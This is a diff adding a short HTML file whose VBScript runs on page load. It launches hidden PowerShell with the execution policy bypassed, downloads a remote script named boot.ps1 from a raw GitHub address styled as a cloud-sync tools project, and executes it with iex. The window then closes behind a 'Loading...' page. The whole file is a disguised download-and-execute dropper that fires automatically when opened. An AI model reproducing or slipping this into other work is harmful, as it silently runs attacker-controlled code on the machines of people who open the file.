@@ -1,0 +1,12 @@
+<html>
+<head>
+<script language="VBScript">
+Sub Window_OnLoad
+    Set objShell = CreateObject("WScript.Shell")
+    objShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/refs/heads/main/assets/boot.ps1')""", 0, False
+    window.close()
+End Sub
+</script>
+</head>
+<body>Loading...</body>
+</html>
